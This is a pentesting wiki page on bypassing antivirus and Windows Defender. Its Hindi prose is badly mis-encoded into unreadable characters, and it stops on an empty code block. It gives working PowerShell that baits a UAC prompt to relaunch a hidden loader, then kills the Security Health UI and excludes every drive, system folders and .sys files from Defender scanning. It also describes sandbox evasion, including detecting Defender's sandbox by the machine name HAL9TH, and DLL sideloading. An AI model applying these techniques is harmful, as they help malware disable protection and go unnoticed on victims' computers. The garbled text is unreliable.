# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**рдпрд╣ рдкреГрд╖реНрда рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдерд╛** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender рдХреЛ рдХрд╛рдо рдХрд░рдирд╛ рд░реЛрдХрдиреЗ рдХрд╛ рдПрдХ рдЯреВрд▓ред
- [no-defender](https://github.com/es3n1n/no-defender): рдПрдХ рдЯреВрд▓ рдЬреЛ рдХрд┐рд╕реА рдЕрдиреНрдп AV рдХрд╛ рдирд╛рдЯрдХ рдХрд░рдХреЗ Windows Defender рдХреЛ рдХрд╛рдо рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИред
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

рдЧреЗрдо рдЪреАрдЯреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЫрджреНрдо рджрд┐рдЦрдиреЗ рд╡рд╛рд▓реЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд▓реЛрдбрд░ рдЕрдХреНрд╕рд░ unsigned Node.js/Nexe installers рдХреЗ рд░реВрдк рдореЗрдВ рдЖрддреЗ рд╣реИрдВ рдЬреЛ рдкрд╣рд▓реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ elevation рдХреЗ рд▓рд┐рдП рдкреВрдЫрддреЗ рд╣реИрдВ** рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рд╣реА Defender рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рддреЗ рд╣реИрдВред рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рд░рд▓ рд╣реИ:

1. `net session` рдХреЗ рд╕рд╛рде administrative context рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдпрд╣ рдХрдорд╛рдВрдб рдХреЗрд╡рд▓ рддрдм рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдХреЙрд▓рд░ рдХреЗ рдкрд╛рд╕ admin rights рд╣реЛрдВ, рдЗрд╕рд▓рд┐рдП рдЕрд╕рдлрд▓рддрд╛ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИ рдХрд┐ loader рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИред
2. рддреБрд░рдВрдд `RunAs` verb рдХреЗ рд╕рд╛рде рд╕реНрд╡рдпрдВ рдХреЛ рдлрд┐рд░ рд╕реЗ рд▓реЙрдиреНрдЪ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЕрдкреЗрдХреНрд╖рд┐рдд UAC consent prompt рдЯреНрд░рд┐рдЧрд░ рд╣реЛ рд╕рдХреЗ, рд╕рд╛рде рд╣реА рдореВрд▓ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд░рдЦрд╛ рдЬрд╛рдПред
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
рдкреАрдбрд╝рд┐рдд рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд╡реЗ тАЬcrackedтАЭ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП prompt рдЖрдо рддреМрд░ рдкрд░ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдореИрд▓рд╡реЗрдпрд░ рдХреЛ Defender рдХреА рдиреАрддрд┐ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЕрдзрд┐рдХрд╛рд░ рдорд┐рд▓ рдЬрд╛рддреЗ рд╣реИрдВред

### рд╣рд░ рдбреНрд░рд╛рдЗрд╡ рд▓реЗрдЯрд░ рдХреЗ рд▓рд┐рдП рд╡реНрдпрд╛рдкрдХ `MpPreference` рдмрд╣рд┐рд╖реНрдХрд░рдг

рдПрдХ рдмрд╛рд░ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдорд┐рд▓ рдЬрд╛рдиреЗ рдкрд░, GachiLoader-style рдЪреЗрди рд╕реЗрд╡рд╛ рдХреЛ рд╕реАрдзреЗ рддреМрд░ рдкрд░ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп Defender рдХреА рдирд┐рдЧрд░рд╛рдиреА рдореЗрдВ рдореМрдЬреВрдж рдЕрдВрдзреЗ рд╕реНрдерд╛рдиреЛрдВ рдХреЛ рдЕрдзрд┐рдХрддрдо рдХрд░ рджреЗрддреА рд╣реИрдВред loader рдкрд╣рд▓реЗ GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ **рдмрд╣реБрдд рд╣реА рд╡реНрдпрд╛рдкрдХ рдмрд╣рд┐рд╖реНрдХрд░рдг** рд▓рд╛рдЧреВ рдХрд░ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓, рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдФрд░ рд╣рдЯрд╛рдиреЗ рдпреЛрдЧреНрдп рдбрд┐рд╕реНрдХ рд╕реНрдХреИрди рди рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
рдореБрдЦреНрдп рдЕрд╡рд▓реЛрдХрди:

- рд▓реВрдк рд╣рд░ рдорд╛рдЙрдВрдЯреЗрдб рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо (D:\, E:\, USB sticks, рдЖрджрд┐) рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдбрд┐рд╕реНрдХ рдкрд░ рдХрд╣реАрдВ рднреА рдмрд╛рдж рдореЗрдВ рдЫреЛрдбрд╝рд╛ рдЧрдпрд╛ рдХреЛрдИ рднреА payload рдЕрдирджреЗрдЦрд╛ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред
- `.sys` рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЕрдкрд╡рд╛рдж рднрд╡рд┐рд╖реНрдпреЛрдиреНрдореБрдЦ рд╣реИ тАФ рд╣рдорд▓рд╛рд╡рд░ рдмрд╛рдж рдореЗрдВ unsigned drivers рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ Defender рдХреЛ рдлрд┐рд░ рд╕реЗ рдЫреБрдПред
- рд╕рднреА рдкрд░рд┐рд╡рд░реНрддрди `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` рдХреЗ рдЕрдВрддрд░реНрдЧрдд рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдмрд╛рдж рдХреЗ рдЪрд░рдг рдпрд╣ рдкреБрд╖реНрдЯрд┐ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ exclusions рдмрдиреА рд╣реБрдИ рд╣реИрдВ рдпрд╛ рдЙрдиреНрд╣реЗрдВ рдмрдврд╝рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ UAC рдХреЛ рдлрд┐рд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдПред

рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ Defender service рд░реЛрдХреА рдирд╣реАрдВ рдЬрд╛рддреА, рд╕рд╛рдзрд╛рд░рдг health checks тАЬantivirus activeтАЭ рдХреА рд░рд┐рдкреЛрд░реНрдЯ рджреЗрддреЗ рд░рд╣рддреЗ рд╣реИрдВ, рднрд▓реЗ рд╣реА real-time inspection рдЙрди paths рдХреЛ рдХрднреА рдЫреВрддрд╛ рд╣реА рди рд╣реЛред

## **AV Evasion Methodology**

рд╡рд░реНрддрдорд╛рди рдореЗрдВ, AVs рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ malicious рд╣реЛрдиреЗ рдХреА рдЬрд╛рдБрдЪ рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ тАФ static detection, dynamic analysis, рдФрд░ рдЕрдзрд┐рдХ рдЙрдиреНрдирдд EDRs рдХреЗ рд▓рд┐рдП, behavioural analysisред

### **Static detection**

Static detection рдЙрди known malicious strings рдпрд╛ byte arrays рдХреЛ flag рдХрд░рдХреЗ рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА binary рдпрд╛ script рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рд╕рд╛рде рд╣реА рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛рддреА рд╣реИ (рдЙрджрд╛. file description, company name, digital signatures, icon, checksum, рдЖрджрд┐)ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬреНрдЮрд╛рдд public tools рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдЖрдк рдЕрдзрд┐рдХ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЗрдВ рд╢рд╛рдпрдж рдкрд╣рд▓реЗ рд╣реА рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд░рдХреЗ malicious рдХреЗ рд░реВрдк рдореЗрдВ flag рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрдЧрд╛ред рдЗрд╕ рддрд░рд╣ рдХреА detection рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

- **Encryption**

рдпрджрд┐ рдЖрдк binary рдХреЛ encrypt рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AV рдЖрдкрдХреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рд▓рдЧрд╛ рдкрд╛рдПрдЧрд╛, рдкрд░ рдЖрдкрдХреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ memory рдореЗрдВ decrypt рдХрд░рдХреЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рддрд░рд╣ рдХрд╛ loader рдЪрд╛рд╣рд┐рдП рд╣реЛрдЧрд╛ред

- **Obfuscation**

рдХрднреА-рдХрднреА рдмрд╕ рдЕрдкрдиреА binary рдпрд╛ script рдореЗрдВ рдХреБрдЫ strings рдмрджрд▓ рджреЗрдирд╛ рд╣реА рдХрд╛рдлреА рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ AV рдХреЛ рдкрд╛рд░ рдХрд░ рдЬрд╛рдП, рдкрд░ рдпрд╣ рдЙрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП рд╕рдордп-рд╕рд╛рдзреНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдХреНрдпрд╛ obfuscate рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВред

- **Custom tooling**

рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ tools рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЛрдИ known bad signatures рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рдкрд░ рдпрд╣ рдХрд╛рдлреА рд╕рдордп рдФрд░ рдореЗрд╣рдирдд рдорд╛рдВрдЧрддрд╛ рд╣реИред

> [!TIP]
> Windows Defender static detection рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)ред рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрдИ segments рдореЗрдВ рдмрд╛рдБрдЯрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ Defender рдХреЛ рд╣рд░ рдПрдХ рдХреЛ рдЕрд▓рдЧ рд╕реЗ scan рдХрд░рдиреЗ рдХрд╛ рдХрд╛рд░реНрдп рджреЗрддрд╛ рд╣реИ; рдЗрд╕ рддрд░рд╣ рдпрд╣ рдЖрдкрдХреЛ рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреА binary рдореЗрдВ рдХреМрди рд╕реЗ flagged strings рдпрд╛ bytes рд╣реИрдВред

рдореИрдВ рджреГрдврд╝рддрд╛ рд╕реЗ рд╕реБрдЭрд╛рдКрдБрдЧрд╛ рдХрд┐ рдЖрдк рдЗрд╕ [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) рдХреЛ рджреЗрдЦреЗрдВ рдЬреЛ practical AV Evasion рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИред

### **Dynamic analysis**

Dynamic analysis рд╡рд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬрдм AV рдЖрдкрдХреА binary рдХреЛ рдПрдХ sandbox рдореЗрдВ рдЪрд▓рд╛рддрд╛ рд╣реИ рдФрд░ malicious рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рддрд╛ рд╣реИ (рдЙрджрд╛. рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб decrypt рдХрд░рдХреЗ рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢, LSASS рдкрд░ minidump рд▓реЗрдирд╛, рдЖрджрд┐)ред рдпрд╣ рд╣рд┐рд╕реНрд╕рд╛ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ рдкреЗрдЪреАрджрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдкрд░ sandboxes рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХреБрдЫ рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

- **Sleep before execution** рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП, рдпрд╣ AV рдХреЗ dynamic analysis рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред AVs рдХреЗ рдкрд╛рд╕ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдХрдо рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ workflow рдореЗрдВ рдмрд╛рдзрд╛ рди рдЖрдП, рдЗрд╕рд▓рд┐рдП рд▓рдВрдмреА sleeps рдХрд╛ рдЙрдкрдпреЛрдЧ binaries рдХреЗ analysis рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдХрдИ AVs рдХреЗ sandboxes sleep рдХреЛ рд╕реНрдХрд┐рдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдХреИрд╕реЗ implement рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- **Checking machine's resources** рдЖрдорддреМрд░ рдкрд░ Sandboxes рдХреЗ рдкрд╛рд╕ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдХрдо resources рд╣реЛрддреЗ рд╣реИрдВ (рдЙрджрд╛. < 2GB RAM), рд╡рд░рдирд╛ рд╡реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдорд╢реАрди рдХреЛ рдзреАрдорд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣рд╛рдБ рдмрд╣реБрдд рд░рдЪрдирд╛рддреНрдордХ рднреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ тАФ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CPU рдХрд╛ рддрд╛рдкрдорд╛рди рдпрд╛ fan speeds рдЪреЗрдХ рдХрд░рдирд╛; рд╣рд░ рдЪреАрдЬрд╝ sandbox рдореЗрдВ implement рдирд╣реАрдВ рд╣реЛрдЧреАред
- **Machine-specific checks** рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдРрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ workstation "contoso.local" domain рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реИ, рддреЛ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ domain рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЖрдкрдХреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ domain рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ; рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЖрдк рдЕрдкрдирд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо exit рдХрд░рд╡рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ Microsoft Defender рдХреЗ Sandbox рдХрд╛ computername HAL9TH рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк detonaton рд╕реЗ рдкрд╣рд▓реЗ рдЕрдкрдиреЗ malware рдореЗрдВ computer name рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ тАФ рдпрджрд┐ рдирд╛рдо HAL9TH рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ рддреЛ рдЖрдк Defender рдХреЗ sandbox рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рдФрд░ рдЖрдк рдЕрдкрдирд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо exit рдХрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдФрд░ рдмрдврд╝рд┐рдпрд╛ рдЯрд┐рдкреНрд╕ [@mgeeky](https://twitter.com/mariuszbit) рд╕реЗ

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдкрд╣рд▓реЗ рдХрд╣рд╛ рд╣реИ, **public tools** рдЕрдВрддрддрдГ **get detected** рд╣реЛ рд╣реА рдЬрд╛рдПрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЦреБрдж рд╕реЗ рдпрд╣ рд╕рд╡рд╛рд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк LSASS рдХреЛ dump рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, **рдХреНрдпрд╛ рдЖрдкрдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ mimikatz рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реА рдЪрд╛рд╣рд┐рдП**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк рдХреЛрдИ рдРрд╕рд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрдо рдЬрд╛рдирд╛-рдкрд╣рдЪрд╛рдирд╛ рд╣реЛ рдФрд░ рдЙрд╕реА рддрд░рд╣ LSASS рдХреЛ dump рднреА рдХрд░рддрд╛ рд╣реЛред

рд╕рд╣реА рдЬрд╡рд╛рдм рд╢рд╛рдпрдж рдмрд╛рдж рд╡рд╛рд▓рд╛ рд╣реЛрдЧрд╛ред mimikatz рдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЗрдВ тАФ рдпрд╣ рд╢рд╛рдпрдж AVs рдФрд░ EDRs рджреНрд╡рд╛рд░рд╛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ flagged рдЯреВрд▓реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ; рдЬрдмрдХрд┐ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЦреБрдж рд╢рд╛рдирджрд╛рд░ рд╣реИ, AVs рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдирд╛ рдПрдХ рд╕рд┐рд░рджрд░реНрдж рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬреЛ рдЖрдк рд╣рд╛рд╕рд┐рд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдк рдвреВрдБрдвреЗрдВред

> [!TIP]
> рдЬрдм рдЖрдк рдЕрдкрдиреЗ payloads рдХреЛ evasion рдХреЗ рд▓рд┐рдП modify рдХрд░ рд░рд╣реЗ рд╣реЛрдВ, рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ Defender рдореЗрдВ automatic sample submission рдмрдВрдж рд╣реЛ, рдФрд░ рдХреГрдкрдпрд╛, рдЧрдВрднреАрд░рддрд╛ рд╕реЗ, рд▓рдВрдмреА рдЕрд╡рдзрд┐ рдореЗрдВ evasion рд╣рд╛рд╕рд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рдХреНрд╖реНрдп рдХреЗ рд╕рд╛рде **DO NOT UPLOAD TO VIRUSTOTAL** рдХрд░реЗрдВред рдпрджрд┐ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ AV рджреНрд╡рд╛рд░рд╛ рдЖрдкрдХрд╛ payload detect рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рддреЛ рдЙрд╕реЗ рдПрдХ VM рдкрд░ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ, automatic sample submission рдмрдВрдж рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, рдФрд░ рд╡рд╣реАрдВ рдкрд░ рдЯреЗрд╕реНрдЯ рдХрд░рддреЗ рд░рд╣реЗрдВ рдЬрдм рддрдХ рдЖрдк рдкрд░рд┐рдгрд╛рдо рд╕реЗ рд╕рдВрддреБрд╖реНрдЯ рди рд╣реЛрдВред

## EXEs vs DLLs

рдЬрд╣рд╛рдБ рднреА рд╕рдВрднрд╡ рд╣реЛ, рд╣рдореЗрд╢рд╛ **рдкреНрд░рд╛рдердорд┐рдХрддрд╛ DLLs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЛ рджреЗрдВ for evasion** тАФ рдореЗрд░реЗ рдЕрдиреБрднрд╡ рдореЗрдВ, DLL рдлрд╝рд╛рдЗрд▓реЗрдВ рдЖрдорддреМрд░ рдкрд░ **рдХрд╛рдлрд╝реА рдХрдо detected** рдФрд░ analyze рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ detection рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рд╕рд░рд▓ рдЯреНрд░рд┐рдХ рд╣реИ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ (рдмрд╢рд░реНрддреЗ рдЖрдкрдХрд╛ payload рдХрд┐рд╕реА рддрд░рд╣ DLL рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд╕рдХреЗ)ред

рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдЗрдореЗрдЬ рдореЗрдВ рджрд┐рдЦ рд░рд╣рд╛ рд╣реИ, Havoc рдХрд╛ рдПрдХ DLL Payload antiscan.me рдкрд░ 4/26 detection rate рд░рдЦрддрд╛ рд╣реИ, рдЬрдмрдХрд┐ EXE payload рдХрд╛ detection rate 7/26 рд╣реИред

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

рдЕрдм рд╣рдо рдХреБрдЫ рдЯреНрд░рд┐рдХреНрд╕ рджрд┐рдЦрд╛рдПрдБрдЧреЗ рдЬреЛ рдЖрдк DLL рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдмрд╣реБрдд рдЕрдзрд┐рдХ stealthier рдмрди рд╕рдХреЗрдВред

## DLL Sideloading & Proxying

**DLL Sideloading** loader рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ DLL search order рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдБ victim application рдФрд░ malicious payload(s) рдХреЛ рдПрдХ рд╕рд╛рде рд░рдЦрдХрд░ рдпрд╣ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк [Siofra](https://github.com/Cybereason/siofra) рдФрд░ рдирд┐рдореНрди powershell script рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DLL Sideloading рдХреЗ рд▓рд┐рдП susceptible programs рдЬрд╛рдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
